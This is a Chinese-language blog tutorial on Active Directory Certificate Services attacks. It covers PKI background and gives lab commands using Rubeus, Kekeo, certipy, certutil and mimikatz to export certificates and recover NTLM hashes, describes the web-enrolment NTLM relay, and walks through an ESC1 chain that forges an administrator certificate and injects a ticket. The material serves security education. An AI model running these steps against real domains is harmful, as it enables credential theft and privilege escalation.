# ADCS攻击

  
  
&lt;!--more--&gt;  
## 基础知识  
### PKI  
PKI(Public Key Infrastructure,公钥基础设施)是提供公钥加密和数字签名服务的系统或平台，是一个包括硬件、软件、人员、策略和规程的集合，实现基于公钥密码体制的密码和证书的产生、管理、存储、分发和撤销等功能。企业通过采用PKI框架管理密钥和证书，可以建立一个安全的网络环境。  
PKI的基础技术包括公钥加密、数字签名、数据完整性机制、数字信封(混合加密)、双重数字签名等。PKI体系能够实现的功能包括身份验证、数据完整性、数据机密性、操作的不可否认性。  
微软的ADCS就是对PKI的实现，ADCS能够与现有的ADDS进行结合，用于身份验证、公钥加密和数字签名等。ADCS提供所有与PKI相关的组件作为角色服务。每个角色服务负责证书基础架构的特定部分，同时协同工作以形成完整的解决方案。  
(1)CA  
CA(Certificate Authority，证书颁发机构)是PKI系统的核心，其作用包括处理证书申请、证书发放、证书更新、管理已办法的证书、吊销证书和发布证书吊销列表(CRL)等。  
ADCS中的CA有企业CA和独立CA。企业CA必须是域成员，并且通常处于联机状态以颁发证书或证书策略。独立CA可以是成员、工作组或域。独立CA不需要ADDS，并且可以在没有网络的情况下使用。但是在域中基本都是使用企业CA，因为企业CA可以和ADDS进行结合，其信息也存储在活动目录数据库中。企业CA支持基于证书模块创建证书和自动注册证书。  
CA拥有公钥和私钥：  
  - 私钥只有CA知道，私钥用于对颁发的证书进行数字签名。  
  - 公钥任何人都可以知道，公钥用于验证证书是否由CA证书颁发。  
  
那么，如何让客户端信任CA呢？  
我们平时访问https类型的网站，如百度，通过查看其证书可以看到他的根CA，并且显示此证书有效。  
由于已经导入了我们系统信任的根CA，因此通过该根CA颁发的所有证书都是可信的。  
而在活动目录内自己搭建的ADCS，由于在安装企业根CA时，系统使用组策略将根CA添加到域内所有机器的&#34;受信任的根证书颁发机构&#34;中了，因此域内机器默认都信任此根CA颁发的证书。  
  (2)CA层次结构  
常见的CA层次结构有两个级别：根和二级CA。二级CA也叫子从属CA。根CA位于顶级，子从属CA位于第二级。在这种层次结构下，根CA给子从属CA颁发证书认证，子从属CA给下面的应用颁发和管理证书，根CA不直接给应用颁发证书。  
CA的层次结构有如下优点：  
  - 管理层次分明，便于集中管理、政策制定和实施。  
  - 提高CA中心的总体性能、减少瓶颈；  
  - 有充分的灵活性和可扩展性；  
  - 有利于保证CA中心的证书验证效率。  

(3)CRL  
CRL(Certificate Revocation List,证书作废列表)即&#34;证书黑名单&#34;，在证书的有效期间，由于某种原因(如人员调动、私钥泄漏等)导致相应的数字证书内容不再真实可信，此时需要进行证书撤销，说明该证书无效，CRL中列出了被撤销的证书序列号。  
### PKINIT Kerberos认证  
在AS-REQ过程中，Kerberos预身份认证使用的是用户Hash加密时间戳。而ADCS与ADDS紧密配合使用，那我们能够利用证书来进行Kerberos预身份认证呢？  
在RFC4556 Public Key Cryptography for Initial Authentication in Kerberos(PKINIT)中引入了对Kerbeos预身份验证的公钥加密技术支持，可以使用证书的密钥来进行Kerberos预身份认证。  
使用`Rubeus`执行如下命令用证书`administrator.pfx`进行`Kerberos`认证。  
```  
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /domain:xie.com /dc:DC01.xie.com  
```  
当使用证书进行Kerberos认证时，返回的票据PAC中包含用户的NTLM Hash。  
使用`Kekeo`执行如下命令获得`administrator.pfx`证书对应的`administrator`用户的`NTLM Hash`。  
```  
tgt::pac /subject:administrator /castore:current_user /domain:xie.com /user:administrator /cred  
```  
无论`administrator`用户密码怎么更改，使用`administrator.pfx`证书获取的`administrator`用户的NTLM Hash都是最新的。  
### 证书模版  
证书模版(certificate template)是CA的一个组成部分，是证书策略中重要元素，是用于证书注册、使用和管理的一组规则和格式。当CA收到对证书的请求时，必须对该请求应用一组规则和设置，以执行所请求的功能，例如证书颁发或更新。这些规则可以是简单的，也可以是复杂的，适用于所有用户或特定的用户组。  
证书模版是在CA上配置并应用于传入证书请求的一组规则和设置。证书模版还向客户机提供了如何创建和提交有效的证书请求的说明。基于证书模版的证书只能向企业CA颁发。这些模版存储在ADDS中，以供林中的每个CA使用。这允许CA始终能够访问当前标准模版，并确保跨林情况下应用一致。  
证书模版允许管理员发布预先配置的证书，可以大大简化管理CA的任务。证书模版管理单元允许管理员执行以下任务：  
- 查看每个证书模版的属性  
- 复制和修改证书模版  
- 控制哪些用户和计算机可以读取模版并注册证书；  
- 执行与证书模版相关的其他管理任务。  

上面提到了利用证书能进行`PKINIT Kerberos`认证，但是并不是所有的证书都能进行`PKINIT Kerberos`认证。那么，到底哪些模版的证书可用于`Kerberos`认证呢？  
在`Certified_Pre-Owned.pdf`中提到，具有以下扩展权限的证书可以用于Kerberos认证：  
- 客户端身份验证，对应的OID为`1.3.6.1.5.5.7.3.2`  
- `PKINIT`客户端身份验证，对应的`OID`为`1.3.6.1.5.2.3.4`  
- 智能卡登陆，对应的OID为`1.3.6.1.4.1.411.20.2.2`  
- 任何目的，对应的`OID`为`2.5.29.37.0`  
- 子CA  

#### 用户模版  
用户模版是默认的证书模版。其扩展属性中有客户端身份验证，因此用户模版申请的证书可以用于`Kerberos`身份认证。  
利用`certipy`执行如下命令以普通用户hack的权限申请注册一个用户模版的证书  
`certipy req -dc-ip 10.211.5.4 &#34;xie.com/hack:Password@CA-Server.xie.com&#34; -ca xie-CA-SERVER-CA -template User -debug`  
#### 计算机模版  
计算机模版是默认的证书模版。其扩展属性中有客户端身份验证，因此计算机模版申请的证书可以用于Kerberos身份验证。  
利用`certipy`执行如下命令以普通机器用户`machine$`的权限申请注册一个计算机模版的证书。  
`certipy req -dc-ip 10.211.5.4 &#34;xie.com/machine$:root@CA-Server.xie.com&#34; -ca xie-CA-SERVER-CA -template Machine -debug`  
### 证书注册  
现在来看证书的注册流程  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png)
- 客户端生成一对公、私钥。  
- 客户端生成证书签名请求(Certificate Signing Request,CSR)，其中包含客户端生成的公钥以及请求的证书模版、请求的主体等信息。整个CSR用客户端的私钥签名发送给CA。  
- CA收到请求后，从中取出公钥对CSR进行签名校验。校验通过后判断客户端请求的证书模版是否存在，如果存在，根据证书模版中的属性判断请求的主体是否有权限申请该证书。如果有权限，则还要根据其他属性，如发布要求、使用者名称、扩展等属性来生成证书。  
- CA使用其私钥签名生成的证书并发送给客户端。  
- 客户端存储该证书在系统中。  

在安装ADCS时，可以选择网络设备注册服务、证书颁发机构Web注册、证书注册Web服务。  
这里讲一下证书颁发机构Web注册接口。  
在安装ADCS时勾选了&#34;证书颁发机构Web注册&#34;选项，那么可以通过Web方式来申请证书。  
访问ADCS的`10.211.5.4/Certsrv/`路径即可看到该注册接口，需要输入有效的用户名和密码进行认证。  
### 导出证书  
在某些场景下，我们需要导出证书进行一些操作，在导出证书前，需要先查看证书的Hash，因此需要先查看证书的信息。如下命令可用于查看用户证书和机器证书的信息。  
```powershell  
#查看用户证书  
certutil -user -store My  
#查看机器证书  
certutil -store My  
#导出用户证书  
certutil -user -store My 证书的hash C:\user.cer  
#导出包含公私钥的用户证书，会要求输入密码  
certutil -user -exportPFX 证书的hash C:\user.pfx  
#导出机器证书  
certutil -store My 证书的hash C:\machine.cer  
#导出包含公私钥的机器证书，会要求输入密码  
certutil -exportPFX 证书的hash C:\machine.pfx  
```  
有些证书不允许包含公私钥的证书，需要用到`mimikatz`  
```  
mimikatz.exe  
crypto::capi  
crypto::certificates /systemstore:local_machine /store:my /export  
```  
## ADCS的安全问题  
### Web证书注册接口NTLM Relay攻击  
#### 漏洞原理  
该漏洞产生的主要原因是ADCS支持Web注册，也就是ADCS服务在安装的时候勾选了&#34;证书颁发机构Web注册&#34;选项，导致用户可以通过Web来申请注册证书。而Web接口默认只允许NTLM身份认证。  
由于HTTP类型的NTLM流量默认是不签名的，因此造成了NTLM Relay攻击。攻击者可以利用Print Spooler漏洞或Petitpotam漏洞触发目标机器SMB类型的NTLM流量回连攻击机器，然后再将这个SMB类型的NTLM流量中继给Web注册接口以目标机器权限申请一个证书。攻击者拿到该证书后就可以以目标机器权限进行Kerberos身份验证了。  
### 证书模版错误攻击  
#### ESC1  
- 颁发CA授予低权限用户请求权限(默认)  
- 模版中CA管理员审批未启用(默认)  
- 模版中不需要授权的签名(默认)  
- 模版允许低权限用户注册  
- 模版定义了启用认证的EKU  
- 证书模版允许请求者在CSR中指定一个SAN 

当满足上述条件时，攻击者在请求证书时可以通过  
`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`字段来声明自己的身份，从而获取到伪造身份的证书。  
可以使用`certify.exe`来查看我们配置，发现`msPKI-Sertificate-Name-Flag`的属性值为`ENROLLEE_SUPPLIES_SUBJECT`，也就是可以指定使用者身份。  
可以利用此模版来申请一个证书。  
```  
certify.exe request /ca:CA-Server.com /template:ECSC1 /altname:administrator  
```  
把密钥复制出来，保存在`ESC1.pem`，然后利用`openssl`来转换成`pfx1`。  
- key后缀，只包含私钥  
- crt/cer后缀，只包含公钥  
- csr后缀，证书申请文件，不包含公私钥。  
- pfx/pem/p12后缀，包含公私钥  

```  
openssl pkcs12 -in ESC1.pem -keyex -CSP &#34;Microsoft Enhanced CryptoGraphic Provider v1.0&#34; --export -out ESC1.pfx  
```  
利用`Rubeus.exe`来申请所需要的`TGT`，此处的`ESC1.pfx`就是我们刚刚申请的证书。  
`Rubeus.exe asktgt /user:administrator /certificate:ESC1.pfx /dc:1.1.1.1 /ptt`  
  
## Reference  
https://tttang.com/archive/1593/  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/adcs%E6%94%BB%E5%87%BB/  

